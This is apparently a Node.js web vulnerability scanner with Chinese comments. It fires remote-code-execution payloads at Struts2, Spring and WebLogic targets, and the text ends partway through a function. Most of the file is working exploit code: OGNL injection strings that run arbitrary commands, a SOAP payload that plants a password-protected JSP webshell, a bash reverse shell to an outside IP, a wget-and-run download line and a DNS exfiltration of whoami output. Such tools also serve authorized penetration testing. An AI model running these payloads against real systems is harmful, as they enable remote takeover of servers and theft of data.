#!/usr/bin/env node
require('./lib/core.js');
program.version(szMyName)
	.option('-u, --url [value]', 'check url, no default')
	.option('-p, --proxy [value]', 'http proxy,eg: http://127.0.0.1:8080, or https://127.0.0.1:8080, no default，设置代理')
	.option('-t, --t3 [value]', 'check weblogic t3,default false，对T3协议进行检测，可以指定文件名列表进行检测')
	.option('-i, --install', 'install node modules,run: npm install')
	.option('-v, --verbose', 'show logs')
	.option('-w, --struts2 [value]', 'struts2 type,eg: 045')
	.option('-C, --cmd [value]', 'cmd type,eg: "ping -c 3 www.baidu.com"')
	.option('-o, --timeout', 'default ' + timeout)
	.option('-l, --pool', 'default ' + g_nPool)
	.option('-r, --test', 'test')
	.option('-m, --menu [value]', 'scan url + menus, default ./urls/ta3menu.txt')
	.option('-s, --webshell [value]', 'scan webshell url，设置参数才会运行, default ./urls/webshell.txt')
	.option('-d, --method [value]', 'default PUT,DELETE,OPTIONS,HEAD,PATCH test')
	.option('-a, --host ', 'host attack test,设置代理后该项功能可能无法使用,default true')
	.option('-k, --keys [value]', 'scan html keywords, default ./urls/keywords')
	.on('--help',fnMyHelp)	
	.parse(process.argv);
timeout = program.timeout || timeout;
g_nPool = program.pool || g_nPool;

if(program.cmd && "string" == typeof program.cmd)
{
	g_szCmdW = g_szCmd = program.cmd;
}
// 检查对象
var a = process.argv.splice(2);
// 结合当前argv参数，生成payload
fnMkPayload();

g_szUrl = program.url || 1 == a.length && a[0] || "";
if(!/[\?;!&]|(\.jsp|do)/.test(g_szUrl) && '/' != g_szUrl.substr(-1))
	g_szUrl += "/";

if(-1 == g_szUrl.indexOf("http"))
	g_szUrl = "http://" + g_szUrl;

// 生成安装包信息：package.json
if(program.install)
{
	var aI,szT = fs.readFileSync(__filename),
		r2 = /require\(['"]([^'"]+)['"]\)/gmi,szPkg = __dirname + "/package.json",
		oPkg = JSON.parse(fs.readFileSync(szPkg));
	while(aI = r2.exec(szT))
	{
		oPkg["dependencies"][aI[1]] = "";
		console.log(aI[1] + " = " + oPkg["dependencies"][aI[1]]);
	}
	fs.writeFileSync(szPkg,JSON.stringify(oPkg));
	process.exit(0);
}

// 设置代理设置
if(program.proxy)
{
	request = request.defaults({'proxy': program.proxy});
	var a1 = program.proxy.split(/:\/\//g)
	if(a1 && 2 == a1.length)
	{
		process.env[a1[0].toLowerCase() + "_proxy"] = program.proxy;
		try{require('global-tunnel').initialize()}catch(e){}
	}
}

/*
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
        <java><java version="1.4.0" class="java.beans.XMLDecoder">
            <object class="java.io.PrintWriter">
                <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/a.jsp</string><void method="println">
                    <string><![CDATA[<%if("***xx@xePe[/".equals(request.getParameter("pwd"))){  
                        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();  
                        int a = -1;  
                        byte[] b = new byte[2048];  
                        out.print("<pre>");  
                        while((a=in.read(b))!=-1){  
                            out.println(new String(b));  
                        }  
                        out.print("</pre>");} %>]]></string></void><void method="close"/>
            </object>
        </java>
      </java>
    </work:WorkContext>
  </soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>
*/
function fnCheckWeblogicCve201710271(url)
{
	var n = url.indexOf('/',10) + 1, s = url.substr(0, 0 == n ? url.length : n),
	a = [s + '/wls-wsat/CoordinatorPortType',s + '/wls-wsat/CoordinatorPortType11'],
	aCmd = [
	['/bin/bash','-c',"nslookup `whoami`.{0}.{1}.cp4lxt.ceye.io"],
	['C:\\Windows\\System32\\cmd.exe','/c', 'nslookup %USERDOMAIN%.%USERNAME%.{0}.{1}.cp4lxt.ceye.io']
	],
	aPLs = ['<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java version="1.8.0_131" class="java.beans.XMLDecoder"><void class="java.lang.ProcessBuilder"><array class="java.lang.String" length="3"><void index="0"><string><![CDATA[',
		']]></string></void><void index="1"><string><![CDATA[',
		']]></string></void><void index="2"><string><![CDATA[',
		']]></string></void></array><void method="start"/></void></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>'],
	headers = {
	'Host': '127.0.0.1:7001',
	'Content-Type': 'text/xml'
	};
	// get 200
	// post 500
	// 确认
}
// t3检测
if(program.t3)
{
	var nPort = -1 < g_szUrl.indexOf("https")? 443: 80;
	// 批量检测
	if("string" == typeof program.t3)
	{
		var aT1 = fs.readFileSync(program.t3).toString().trim().split("\n"), p;
		for(var k in aT1)
		{
			runChecks(aT1[k],"t3,weblogic");
		}
	}
	else
	{
		runChecks(g_szUrl,"t3,weblogic");
	};
}

// 伪造host攻击测试
function fnDoHostAttack(url,fnCbk)
{
	if(bRunHost)return;
	bRunHost = true;
	try{
		var nPort = -1 < g_szUrl.indexOf("https")? 443: 80;
		var uO = urlObj.parse(url), ss = "I.am.M.T.X.T",host = uO.host.split(/:/)[0], port = uO.port || nPort;
		if(/.*?\/$/g.test(uO.path))uO.path = uO.path.substr(0, uO.path.length - 1);
		// checkWeblogicT3(host,port);

		if(program.t3)fnCheckJavaFx([host,port].join(":"));
		fnSocket(host,port,'POST ' + uO.path + ' HTTP/1.1\r\nHost:' 
			+ ss + '\r\nUser-Agent:Mozilla/5.0 (iPhone; CPU iPhone OS 10_2 like ' 
				+ szMyName 
				+ ') ' + g_szUa + ' MTX/3.0\r\nContent-Type: application/x-www-form-urlencoded' 
		+ '\r\n\r\n',
			function(data)
		{
			var d = data && data.toString().trim() || "";
			
			fnParseHttpHd(d,function(o)
			{
				var oD = {des:"伪造host攻击测试成功"};
				if(o.location && -1 < String(o.location).indexOf(ss))
				{
					g_oRst["host"] = oD;
					oD.des += ", response返回的location：" + o.location;
				}
				var n = d.indexOf(ss);
				if(-1 < n)
				{
					var rg = new RegExp("(<.*?http:\\/\\/" + ss + ".*?>)","gim");
					var a = rg.exec(d);
					if(a)
					{
						var o = g_oRst["host"] || oD;
						o.code = "返回的代码中存在攻击后的代码:" + a[1];
						g_oRst["host"] = o;
					}
				}
			});
		});
	}catch(e){fnLog(e)}
}

// 单个方法测试
function fnTest(s)
{
	request(
	    fnOptHeader({ method: s ||'PUT'
	    ,"uri": g_szUrl//.substr(0,url.lastIndexOf("/"))
	    ,headers:{'Access-Control-Request-Method':'GET,HEAD,POST,PUT,DELETE,CONNECT,OPTIONS,TRACE,PATCH'}
	    , multipart:'HEAD' == s|| 'OPTIONS' == s? null:
	      [ { 'content-type': 'application/json'
	        ,  body: JSON.stringify({foo: 'bar', _attachments: {'test.jsp': {follows: true, length: 18, 'content_type': 'text/plain' }}})
	        }
	      , { body: 'I am an attachment' }
	      ]
	    })
	  , function (error, response, body) {
	  		if(!response)return;
	      	if(response && -1 <  [201,200].indexOf(response.statusCode))
	      	{
	      		// console.log(response.headers);
	      		g_oRst.method || (g_oRst.method = {});
	      		g_oRst.method[s] = "开启了" + s + "、应该关闭，建议仅允许GET、POST";
	      		if(response.headers['allow'])
	      			g_oRst.method['allow'] = "确定这些都是必要的：" + response.headers['allow'];
	      	}
	      	var a = ["x-powered-by","server"];
	      	for(var k in a)
	      	if(!g_oRst[a[k]] && response && response.headers && response.headers[a[k]])
	      		g_oRst[a[k]] = "应该屏蔽 " + response.headers[a[k]];
	      	if(response && response.headers && response.headers["location"])
	      	{
	      		g_oRst["location"] = "建议在服务器端跳转 " + response.headers["location"];
	      		if(szLstLocation != response.headers["location"])
	      		{
	      			// url
	      			szLstLocation = response.headers["location"];
	      			fnTestAll();
	      		}
	      	}
	      	for(var k in aHS)
	      	{
	      		if(!response.headers[aHS[k]])
	      		{
	      			g_oRst.safeHeader || (g_oRst.safeHeader = {});
	      			g_oRst.safeHeader[aHS[k]] = "确定不需要该安全头信息 " + aHS[k];
	      		}
	      	}
	      	g_oRst.safeHeader.des = "作为安全要求、规范要求，建议加上缺失的头信息";
	    }
	  );
}

/*
Spring WebFlow 远程代码执行漏洞(CVE-2017-4971)
&_T(java.lang.Runtime).getRuntime().exec("/usr/bin/wget -qO /tmp/1 http://192.168.2.140:8000/1")
&_T(java.lang.Runtime).getRuntime().exec("/bin/bash /tmp/1")
&_(new+java.lang.ProcessBuilder("touch /tmp/success2")).start()=test
*/
function DoWebFlow(url)
{
	request(fnOptHeader({method: 'POST',uri: url + "?" + s,"formData":{"&_(new+java.lang.ProcessBuilder(\"touch /tmp/success2\")).start()=":"test"}}),
    	function(e,r,b)
    {
    	fnDoBody(b,"SpringWebFlow-CVE-2017-4971",url);
    });
}

/*
Spring Boot whitelabel-error-page SpEl 代码执行漏洞(gh-4763)
payload=${T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{119,104,111,97,109,105}))}.
*/
function DoSpringBoot(url)
{
	request(fnOptHeader({method: 'POST',uri: url + "?" + s,"formData":{"&_(new+java.lang.ProcessBuilder(\"touch /tmp/success2\")).start()=":"test"}}),
    	function(e,r,b)
    {
    	fnDoBody(b,"SpringBoot-gh-4763",url);
    });
}

// s2033_poc = "/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23parameters.content[0]%2b602%2b53718),%23wr.close(),xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=2908"
function doStruts2_033(url)
{
	var szOldUrl = url;
	url = url.substr(0, url.lastIndexOf('/') + 1) + encodeURIComponent(g_postData) + ",mtx.toString.json?ok=1";
	request(fnOptHeader({method: 'POST',uri: url}),
    	function(e,r,b)
    {
    	fnDoBody(b,"s2-033",szOldUrl);
    });
}
// integration/saveGangster.action
function doStruts2_048(url,fnCbk)
{
	var szOldUrl = url;
	if('/' == url.substr(-1))url = url.substr(0,url.length - 1);
	this.name = this.name || "name";

	var payload = "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)." + 
		"(#_memberAccess?(#_memberAccess=#dm):" + 
		"((#container=#context['com.opensymphony.xwork2.ActionContext.container'])." + 
		"(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))" + 
		".(#ognlUtil.getExcludedPackageNames().clear())"+ 
	 	".(#ognlUtil.getExcludedClasses().clear())" + 
		".(#context.setMemberAccess(#dm))))" + 
		".(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))" + 
		".(#cmds=(#iswin?{'cmd.exe','/c','" + g_szCmdW + "'}:{'/bin/bash','-c','" + g_szCmd + "'}))" + 
		".(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true))" + 
		".(#process=#p.start())"
		+ ".(#response=@org.apache.struts2.ServletActionContext@getResponse())"
		// + ".(#response.addHeader('struts2','_struts2_'))"
		+".(#ros=#response.getOutputStream())" + 
		".(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
    var data = {"age": 20};
    data[this.name] = g_postData || payload;
    request(fnOptHeader({method: 'POST',uri: url,"formData":data,"headers":{Referer:url}}),
    	function(e,r,b)
    {
    	fnDoBody(b,"s2-048",szOldUrl);
    	// console.log(e || b || r);
    });
}

function myLog(a)
{
	/*
	// console.log(String(a.callee))
	var c = a.callee.caller;
	// if(c.arguments && c.arguments.caller)console.log(c.arguments.caller)
	if(a.callee.caller)
	{
		// console.log(a.callee.caller.arguments.toString());
		a = a.callee.caller.arguments;
		if(0 < a.length)myLog(a);
	}
	*/
}
g_oRst.struts2 || (g_oRst.struts2 = {});

// S2_DevMode_POC = "?debug=browser&object=(%23mem=%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f%23context[%23parameters.rpsobj[0]].getWriter().println(%23parameters.content[0]):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=25F9E794323B453885F5181F1B624D0B"
function doStruts2_DevMode(url)
{
	// debug=browser&object=
	// debug=command&expression=
	request(fnOptHeader({method: 'POST',uri: url + "?debug=browser&expression=" + encodeURIComponent(g_postData) + ":xx.toString.json&ok=1"}),
    	function(e,r,b)
    {
    	fnDoBody(b,"s2-DevMode",url);
    });
}
// s2-007 ' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('whoami').getInputStream())) + '

function fnNotEnd(url)
{
	if('/' == url.substr(-1))url = url.substr(0,url.length - 1);
	return url;
}

// http://192.168.10.216:8088/S2-001/login.action
// bash -i >& /dev/tcp/192.168.24.90/8080 0>&1
function doStruts2_001(url)
{
	var szOldUrl = url;
	url = fnNotEnd(url);
	this.name = this.name || "username";
	var s = ('%{#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\')),#cmds=(#iswin?{\'cmd.exe\',\'/c\',\'' + g_szCmdW + '\'}:{\'/bin/bash\',\'-c\',\'' + g_szCmd + '\'}),#a=(new java.lang.ProcessBuilder(#cmds)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse")'
		+',#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000]'
		+ ',#wt=#f.getWriter()'
		+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
		+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
		+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
		+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
		+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
		+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
		+ ',#wt.flush()'
		+',#wt.close()}');

	request(({method: 'POST',uri: url 
		,body:this.name + "=" + encodeURIComponent(s) + "&password="
		,headers:
	    {
	    	"user-agent": g_szUa,
	    	"content-type":"application/x-www-form-urlencoded"
	    }}),
    	function(e,r,b)
    {
    	// console.log(b);
    	fnDoBody(b,"s2-001,s2-012",szOldUrl);
    });
}

function doStruts2_005(url, fnCbk)
{
	var szOldUrl = url;
	url = fnNotEnd(url);
	var s = ('%{#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\')),#cmds=(#iswin?{\'cmd.exe\',\'/c\',\'' + g_szCmdW + '\'}:{\'/bin/bash\',\'-c\',\'' + g_szCmd + '\'}),#a=(new java.lang.ProcessBuilder(#cmds)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse")'
		+',#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000]'
		+ ',#wt=#f.getWriter()'
		+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
		+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
		+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
		+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
		+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
		+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
		// + ',#wt.flush()'
		// +',#wt.close()'
		+'}');
	var ss = s.replace(/#/gmi, "\u0023");
	ss = encodeURIComponent(ss);
	request(fnOptHeader({method: 'GET',uri: url + "?" + ss + "=1"
	    ,headers:
	    {
	    	"User-Agent": g_szUa,
	    	"Content-Type":"application/x-www-form-urlencoded"
	    }})
	  , function (error, response, body){
	  		if(body)
	  		{
	  			fnDoBody(body,"s2-005",szOldUrl);
	  		}
	    }
	  );
	ss = g_postData.replace(/#/gmi, "\\43");
	request(fnOptHeader({method: 'GET',uri: url + "?s=" + ss
	    ,headers:
	    {
	    	"User-Agent": g_szUa,
	    	"Content-Type":"application/x-www-form-urlencoded"
	    }})
	  , function (error, response, body){
	  		if(body)
	  		{
	  			fnDoBody(body,"s2-005",szOldUrl);
	  		}
	    }
	  );
}

function doStruts2_019(url, fnCbk,bW)
{
	var szOldUrl = url;
	url = fnNotEnd(url);
	// (@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\'))
	var s = ('#iswin=' + !!bW + ',#cmds=(#iswin?{\'cmd.exe\',\'/c\',\'' + g_szCmdW + '\'}:{\'/bin/bash\',\'-c\',\'' + g_szCmd + '\'}),#a=(new java.lang.ProcessBuilder(#cmds)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse")'
		+',#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#wt=#f.getWriter(),#wt.println(new java.lang.String(#e)),#e=new char[50000],#d.read(#e),#wt=#f.getWriter(),#wt.println(new java.lang.String(#e)),#e=new char[50000],#i=#d.read(#e),#wt=#f.getWriter(),#wt.println(new java.lang.String(#e,0,#i)),#e=new char[50000],#i=#d.read(#e),#wt=#f.getWriter(),#wt.println(new java.lang.String(#e,0,#i)),#e=new char[50000],#i=#d.read(#e),#wt=#f.getWriter(),#wt.println(new java.lang.String(#e,0,#i)),#e=new char[50000],#i=#d.read(#e),#wt=#f.getWriter(),#wt.println(new java.lang.String(#e,0,#i)),#wt.flush()'
		+',#wt.close()');
	request(fnOptHeader({method: 'GET',uri: url + "?debug=command&expression=" 
		+ encodeURIComponent(s)
		})
	  , function (error, response, body){
	  	// console.log(error||body);
	  		if(body)
	  		{
	  			fnDoBody(body.replace(/\u0000/gmi,''),"s2-019",szOldUrl);
	  		}
	    }
	  );
	if(!bW)doStruts2_019(url,null,true);
}

/*
(%23_memberAccess['allowPrivateAccess']=true,%23_memberAccess['allowProtectedAccess']=true,%23_memberAccess['excludedPackageNamePatterns']=%23_memberAccess['acceptProperties'],%23_memberAccess['excludedClasses']=%23_memberAccess['acceptProperties'],%23_memberAccess['allowPackageProtectedAccess']=true,%23_memberAccess['allowStaticMethodAccess']=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream()))
*/
function doStruts2_029(url, fnCbk,bW)
{
	var szOldUrl = url;
	url = fnNotEnd(url);
	this.name = this.name || "message";
	var s1 = (g_postData),s = 
		// s-045不允许下面的代码
		
		"#_memberAccess['allowPrivateAccess']=true"
		+ ",#_memberAccess['allowProtectedAccess']=true"
		+ ",#_memberAccess['excludedPackageNamePatterns']=#_memberAccess['acceptProperties']"
		+ ",#_memberAccess['excludedClasses']=#_memberAccess['acceptProperties'],#_memberAccess['allowPackageProtectedAccess']=true"
		+ ",#_memberAccess['allowStaticMethodAccess']=true"
		// + ",(#_memberAccess['acceptProperties']=true)"
		
		// + ",(#_memberAccess['excludedPackageNamePatterns']=true)"
		// + ",("
		// s2-048不能加下面的代码
		
		
		// + ".(#_memberAccess['acceptProperties']=true)"
		// + ".("
		//,szDPt = g_postData.replace(/\.\(#rplc=true\)/, s);

		s = "(" + s + ",#mtx=new java.lang.Boolean('false'),#context['xwork.MethodAccessor.denyMethodExecution']=#mtx"
		+ ",#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))"
		+ ",#cmds=(#iswin?{'cmd.exe','/c','" + g_szCmdW + "'}:{'/bin/bash','-c','" + g_szCmd + "'})"
		+ ",#p=new java.lang.ProcessBuilder(#cmds)"
		+ ",#as=new java.lang.String()"
		+ ",#p.redirectErrorStream(true),#process=#p.start()"
		+ ",#b=#process.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000]"
		+ ",#i=#d.read(#e),#as=#as+new java.lang.String(#e,0,#i)" 
		+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
		+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
		+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
		+ ",#as.toString()"
		+")";
	// console.log(encodeURIComponent(s));
	// console.log(url);
	request(fnOptHeader({method: 'GET',uri: url + "?" + this.name + "=" + encodeURIComponent(s)
		/*
		,"formData":{"message":s}
	    ,headers:
	    {
	    	"User-Agent": g_szUa,
	    	"Content-Type":"application/x-www-form-urlencoded"
	    }//*/
		})
	  , function (error, response, body){
	  		// console.log(error || body);
	  		if(body)
	  		{
	  			fnDoBody(body,"s2-029",szOldUrl);
	  		}
	    }
	  );
}

/*
// payload = {'method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#writer.println(#parameters.tag[0]),#writer.flush(),#writer.close': '', 'tag': tag}
在配置了 Struts2 DMI 为 True 的情况下，可以使用 method:<name> Action 前缀去调用声明为 public 的函数，
DMI 的相关使用方法可参考官方介绍（Dynamic Method Invocation），
这个 DMI 的调用特性其实一直存在，只不过在低版本中 Strtus2 不会对 name 方法值做 OGNL 计算，而在高版本中会
///////////*/
function doStruts2_032(url)
{
	var szOldUrl = url;
	url = fnNotEnd(url);
	var oParms = {},s;
	// 测试证明，有些@要编码，有些不能编码
	//s = "%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString";
	s = "%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),"
	+ "#c=new java.lang.ProcessBuilder(#parameters.cmd[0]),#p.redirectErrorStream(true),#process=#p.start()"
	+ ",%23s%3dnew+java.util.Scanner(#process.getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString";


	//s = "%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23context[%23parameters.obj[0]].getWriter().print(%23parameters.content[0]%2b555%2b12345),1?%23xx:%23request.toString&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=11602011"

	//console.log(encodeURIComponent(s));

	
	// oParms[s = "method:" + encodeURIComponent(s)] = "";
	// oParms["mtxtest"] = "ok";
	var n = 12345 + 555 + 11602011;
	request(fnOptHeader({method: 'GET',uri: url + "?method:" 
		+ s
	+ "&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=id"// + encodeURIComponent(g_szCmd.replace(/;/gmi,"&&"))
		}),
    	function(e,r,b)
    {
    	var szTmp = String(e || b);
    	// console.log(szTmp);
    	if(-1 < szTmp.indexOf('1160201155512345'))
    		g_oRst.struts2 = {des:"发现s2-032高危漏洞","s2-032":"存在高危漏洞"};
    	else fnDoBody(b,"s2-032",szOldUrl);
    });

}

// 测试所有，便于更改url重复测试
function fnTestAll()
{
	if(!program.proxy && false !== program.host)
	fnDoHostAttack(g_szUrl,function(o)
	{
		fnLog(o);
	},null);
	var ss = "string" != typeof(program.method) && "PUT,DELETE,OPTIONS,HEAD,PATCH" || program.method;
	var aMethod = ss.split(/[,;]/);
	for(var k in aMethod)
		fnTest(aMethod[k]);
}

// 反序列化检测
// java -jar ~/safe/mtx_jfxl/jfxl.jar 192.178.10.1/24:7001
function fnCheckJavaFx(s)
{
	var szF = "~/safe/mtx_jfxl/jfxl.jar";
	child_process.exec("ls " + szF,function(e,so,se)
	{
		if(!so)
		{
			console.log("mkdir ~/safe && cd ~/safe && git clone https://github.com/hktalent/weblogic_java_des.git\njava -jar ~/safe/mtx_jfxl/jfxl.jar " + s);

		}
		else
		{
			szF = "java -jar " + szF + " " + s;
			
			child_process.exec(szF,function(e,so,se)
			{
				szF = __dirname + "/data/" + s.replace(/:/gmi,"_") + ".txt";
				if(fs.existsSync(szF))
				{
					g_oRst.weblogic_java_des = {des:"发现weblogic【高危】java反序列化漏洞",result:szF};
				}
				if(e)fnLog(e.toString());
			});
		}
	});
	
}


var g_reServer = /(Tomcat|JBossWeb|JBoss[\-\/][\d\.]+)/gmi;



// 避免重复处理
var g_HtmlMd5Cf = {};

// 避免重复,后期可以支持字典目录，多个字典目录，这样可以扫描更多
var g_mUrls = {};
// 检查ta3默认菜单
function fnCheckTa3(u,dict,szDes,type)
{
	var j = u.lastIndexOf('/');
	if(10 < j)u = u.substr(0, j + 1);
	else u += '/';

	fnLog("start check " + dict);
	var s = dict,a,i = 0,fnCbk = function(url,fnCbk1)
	{
		fnLog("check " + u + url);
		
		request(fnOptHeader({method: 'GET',uri: u + url
		    ,headers:
		    {
		    	"User-Agent": g_szUa
		    }
		})
		, function (error, response, body)
		{
			fnCbk1(null,null);
			if(!error && body)
			{
				var md5sum = crypto.createHash('md5');
				md5sum.update(body.toString());
				var szMd5 = md5sum.digest('hex');
				if(g_HtmlMd5Cf[szMd5])return;
				g_HtmlMd5Cf[szMd5] = 1;
				// content-length 不同来判断不同值
				// if(!response.headers['content-length'])console.log(body)
				fnDoBody(body,"ta3menus");
				if(200 === response.statusCode)
				{
					var re = /<title>([^<]*)<\/title>/gmi, t = re.exec(body);
					t && (t = t[1].trim());t || (t = "");
					var oTm = (g_oRst[type] || (g_oRst[type] = {}));
					
					oTm.des = szDes + ",这些url响应http 200";
					oTm.urls  || (oTm.urls = []);
					oTm.urls.push([u + url,t].join(","));
				}
			}
		}).on('error', function(err) {
			// console.log(err)
		});
	};
	if(fs.existsSync(s))
	{
		a = String(fs.readFileSync(s)).trim().split(/\n/);
		// 并发5个线程
		async.mapLimit(a,5,function(s,fnCbk1)
		{
			g_mUrls[a[i]] = true;
			fnCbk(s,fnCbk1);
		});
		/*
		for(; i < a.length; i++)
		{
			if(g_mUrls[a[i]])continue;
			g_mUrls[a[i]] = true;
			// console.log(a[i]);
			fnCbk(a[i]);
		}*/
	}else fnLog("不存在: " + s);
}
// 全部编码为%xx格式
function fnMakeData(s)
{
	return s.replace(/./gmi,function(a)
	{
		return '%' + String(a).charCodeAt(0).toString(16);
	});
}

// java -jar ~/safe/mtx_jfxl/bin/jfxl.jar 192.168.18.89:7001
/*
// console.log(fnMakeData(g_postData));
var oTmp = {
		"dto['naac002']":encodeURIComponent(g_postData),
		"dto['npassword']":encodeURIComponent(g_postData)
		};
	oTmp[encodeURIComponent(g_postData)] = "ok";
request.post(//  + encodeURIComponent(g_postData)
	{
	uri:"http://192.168.10.212:40912/queryPersonInfoAction.do",
	headers:{'Content-Type':'text/xml;charset=UTF-8'},
	formData:oTmp
	}
	,function(e,r)
	{
		if(!e)console.log(r.body);
		console.log(e);
	});
//*/

//
function doStruts2_009(url, fnCbk)
{
	this.name = this.name || "id";
	request(fnOptHeader({method: 'GET',uri: url + "?" + this.name + "=" + encodeURIComponent(g_postData) + "&(" + this.name + ")('x')=1"
	    ,headers:
	    {
	    	"User-Agent": g_szUa,
	    	"Content-Type":"application/x-www-form-urlencoded"
	    }})
	  , function (error, response, body){
	  		if(body)
	  		{
	  			fnDoBody(body,"s2-009",url);
	  		}
	    }
	  );
}
/*
如果在配置 Action 中 Result 时使用了重定向类型，并且还使用 ${param_name} 作为重定向变量
<result name="redirect" type="redirect">/index.jsp?name=${name}</result>
*/
function doStruts2_012(url, fnCbk)
{
	var s = "%{#_memberAccess[\"allowStaticMethodAccess\"]=true,#mtx=new java.lang.Boolean(\"false\"),#context[\"xwork.MethodAccessor.denyMethodExecution\"]=#mtx"
	+ ",#iswin=(@java.lang.System@getProperty(\"os.name\").toLowerCase().contains(\"win\"))"
	+ ",#cmds=(#iswin?{\"cmd.exe\",\"/c\",\"" + g_szCmdW + "\"}:{\"/bin/bash\",\"-c\",\"" + g_szCmd + "\"})"
	+ ",#p=new java.lang.ProcessBuilder(#cmds)"
	+ ",#as=new java.lang.String()"
	+ ",#p.redirectErrorStream(true),#process=#p.start()"
	+ ",#b=#process.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000]"
	+ ",#i=#d.read(#e),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
	+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
	+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
	+ ",#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\").getWriter()"
	+ ",#f.println(#as)"
	+ ",#f.flush()"
	+ ",#f.close()"
	+"}";
	this.name = this.name || "name";
	var oForm = {};
	oForm[this.name] = s;
	request(fnOptHeader({method: 'POST',uri: url
	    ,"formData":oForm
	    ,headers:
	    {
	    	"User-Agent": g_szUa,
	    	"Content-Type":"application/x-www-form-urlencoded"
	    }})
	  ,function (error, response, body){
	  		if(body)
	  		{
